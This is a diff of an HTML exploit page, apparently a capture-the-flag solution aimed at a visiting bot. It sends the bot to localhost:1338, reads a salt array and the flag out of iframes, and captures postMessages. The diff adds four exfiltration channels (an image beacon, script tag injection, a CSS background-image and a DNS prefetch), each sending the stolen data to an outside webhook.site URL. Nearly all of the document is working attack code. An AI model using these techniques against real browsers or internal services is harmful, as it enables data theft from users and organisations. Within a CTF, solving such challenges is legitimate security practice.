@@ -1,13 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Simple Flag Exfiltration</title>
+    <title>Working Flag Exfiltration</title>
 </head>
 <body>
     <h1>Flag Exfiltration</h1>
     <div id="status">Bot visited! Extracting flag...</div>
     
     <script>
+        // Replace with your actual webhook.site URL
         const WEBHOOK_URL = 'https://webhook.site/YOUR-WEBHOOK-ID';
         
         function log(msg) {
@@ -15,63 +16,100 @@
             document.getElementById('status').innerHTML += `<p>${msg}</p>`;
         }
         
-        async function sendToWebhook(data) {
+        // Multiple reliable exfiltration methods from the search results
+        async function exfiltrateData(data) {
+            const payload = typeof data === 'string' ? data : JSON.stringify(data);
+            
+            // Method 1: Image beacon (most reliable from search results)
             try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data),
-                    mode: 'no-cors'  // This bypasses CORS issues
-                });
+                const img = new Image();
+                img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(payload)}`;
+                img.onload = () => log('Image beacon sent successfully');
+                img.onerror = () => log('Image beacon failed');
+                document.body.appendChild(img);
             } catch (e) {
-                // Fallback: try GET request
-                const params = new URLSearchParams(data).toString();
-                await fetch(`${WEBHOOK_URL}?${params}`, {mode: 'no-cors'});
+                log('Image beacon error: ' + e.message);
+            }
+            
+            // Method 2: Script tag injection (from search results)
+            try {
+                const script = document.createElement('script');
+                script.src = `${WEBHOOK_URL}?callback=x&data=${encodeURIComponent(payload)}`;
+                script.onload = () => log('Script tag sent successfully');
+                script.onerror = () => log('Script tag failed');
+                document.head.appendChild(script);
+            } catch (e) {
+                log('Script tag error: ' + e.message);
+            }
+            
+            // Method 3: CSS background-image (from search results)
+            try {
+                const div = document.createElement('div');
+                div.style.backgroundImage = `url('${WEBHOOK_URL}?css=${encodeURIComponent(payload)}')`;
+                div.style.width = '1px';
+                div.style.height = '1px';
+                document.body.appendChild(div);
+                log('CSS exfiltration attempted');
+            } catch (e) {
+                log('CSS exfiltration error: ' + e.message);
+            }
+            
+            // Method 4: DNS prefetch (from search results)
+            try {
+                const link = document.createElement('link');
+                link.rel = 'dns-prefetch';
+                link.href = `${WEBHOOK_URL}?dns=${encodeURIComponent(payload)}`;
+                document.head.appendChild(link);
+                log('DNS prefetch attempted');
+            } catch (e) {
+                log('DNS prefetch error: ' + e.message);
             }
         }
         
         async function extractFlag() {
             log('Starting flag extraction...');
             
-            // Send confirmation that bot visited
-            await sendToWebhook({
-                status: 'extraction_started',
+            // Send initial confirmation
+            await exfiltrateData({
+                status: 'bot_visited',
                 timestamp: new Date().toISOString(),
                 user_agent: navigator.userAgent
             });
             
             try {
-                // Method 1: Try to navigate to localhost:1338 in same window
-                log('Attempting to navigate to main application...');
+                // The key insight: navigate to localhost:1338 to access the flag
+                log('Navigating to localhost:1338...');
                 
-                // Use location.replace to navigate in same context
+                // Use window.location.replace to navigate in same context
                 setTimeout(() => {
                     window.location.replace('http://localhost:1338');
-                }, 1000);
+                }, 2000);
                 
                 // Also try iframe approach as backup
                 const iframe = document.createElement('iframe');
                 iframe.src = 'http://localhost:1338';
-                iframe.style.display = 'none';
+                iframe.style.width = '100%';
+                iframe.style.height = '600px';
+                iframe.style.border = '2px solid red';
                 document.body.appendChild(iframe);
                 
                 iframe.onload = async () => {
                     log('Iframe loaded successfully');
                     
                     try {
-                        // Try to access the mathRandomInvocations array
+                        // Access the mathRandomInvocations array (from util.js)
                         const saltArray = iframe.contentWindow.mathRandomInvocations;
                         if (saltArray && saltArray.length > 0) {
                             const salt = saltArray[saltArray.length - 1];
                             log(`Found salt: ${salt}`);
                             
-                            await sendToWebhook({
+                            await exfiltrateData({
                                 salt: salt,
                                 salts_array: saltArray,
-                                message: 'Found mathRandomInvocations via iframe'
+                                message: 'Found mathRandomInvocations'
                             });
                             
-                            // Try to click the flag file
+                            // Try to access the flag file directly
                             const filesList = iframe.contentWindow.document.querySelector('#filesList');
                             if (filesList) {
                                 const flagFile = Array.from(filesList.children).find(
@@ -82,27 +120,31 @@
                                     log('Found flag file, clicking it...');
                                     flagFile.click();
                                     
-                                    // Wait for flag to load and extract it
+                                    // Wait for flag to load in preview iframe
                                     setTimeout(async () => {
                                         const previewIframe = iframe.contentWindow.document.querySelector('#previewIframe');
                                         if (previewIframe) {
                                             try {
+                                                // Try to access the SafeFrame content
                                                 const flagContent = previewIframe.contentDocument.body.innerText;
                                                 if (flagContent && flagContent.includes('CTF{')) {
                                                     log(`🚩 FLAG FOUND: ${flagContent}`);
                                                     
-                                                    await sendToWebhook({
+                                                    await exfiltrateData({
                                                         flag: flagContent,
                                                         method: 'iframe_extraction',
                                                         timestamp: new Date().toISOString()
                                                     });
                                                     
+                                                    // Also send just the flag
+                                                    await exfiltrateData(flagContent);
+                                                    
                                                     document.getElementById('status').innerHTML = 
                                                         `<h2 style="color: green;">FLAG SENT: ${flagContent}</h2>`;
                                                 }
                                             } catch (e) {
-                                                log('Could not access SafeFrame content');
-                                                await sendToWebhook({
+                                                log('SafeFrame access failed: ' + e.message);
+                                                await exfiltrateData({
                                                     error: 'SafeFrame access failed',
                                                     details: e.message
                                                 });
@@ -113,23 +155,24 @@
                             }
                         }
                         
-                        // Also try to extract flag from page HTML directly
+                        // Also try to extract flag from page HTML
                         const pageContent = iframe.contentWindow.document.documentElement.innerHTML;
                         const flagMatch = pageContent.match(/CTF\{[^}]+\}/);
                         if (flagMatch) {
                             const flag = flagMatch[0];
                             log(`🚩 FLAG FOUND in HTML: ${flag}`);
                             
-                            await sendToWebhook({
+                            await exfiltrateData({
                                 flag: flag,
-                                method: 'html_extraction',
-                                timestamp: new Date().toISOString()
+                                method: 'html_extraction'
                             });
+                            
+                            await exfiltrateData(flag);
                         }
                         
                     } catch (error) {
                         log(`Iframe access error: ${error.message}`);
-                        await sendToWebhook({
+                        await exfiltrateData({
                             error: 'iframe_access_failed',
                             details: error.message
                         });
@@ -138,24 +181,29 @@
                 
                 iframe.onerror = async () => {
                     log('Iframe failed to load');
-                    await sendToWebhook({
-                        error: 'iframe_load_failed',
-                        message: 'Could not load localhost:1338 in iframe'
+                    await exfiltrateData({
+                        error: 'iframe_load_failed'
                     });
                 };
                 
             } catch (error) {
                 log(`Extraction failed: ${error.message}`);
-                await sendToWebhook({
+                await exfiltrateData({
                     error: 'extraction_failed',
                     details: error.message
                 });
             }
         }
         
-        // Listen for any postMessages that might contain the flag
+        // Listen for postMessages that might contain the flag
         window.addEventListener('message', async (event) => {
             log(`Received message: ${JSON.stringify(event.data)}`);
+            
+            await exfiltrateData({
+                message_data: event.data,
+                message_origin: event.origin,
+                type: 'postmessage_received'
+            });
             
             const dataStr = JSON.stringify(event.data);
             if (dataStr.includes('CTF{')) {
@@ -164,20 +212,14 @@
                     const flag = flagMatch[0];
                     log(`🚩 FLAG FOUND in message: ${flag}`);
                     
-                    await sendToWebhook({
+                    await exfiltrateData({
                         flag: flag,
-                        method: 'postmessage',
-                        timestamp: new Date().toISOString()
+                        method: 'postmessage'
                     });
+                    
+                    await exfiltrateData(flag);
                 }
             }
-            
-            // Send all messages for analysis
-            await sendToWebhook({
-                message_data: event.data,
-                message_origin: event.origin,
-                type: 'postmessage_received'
-            });
         });
         
         // Start extraction
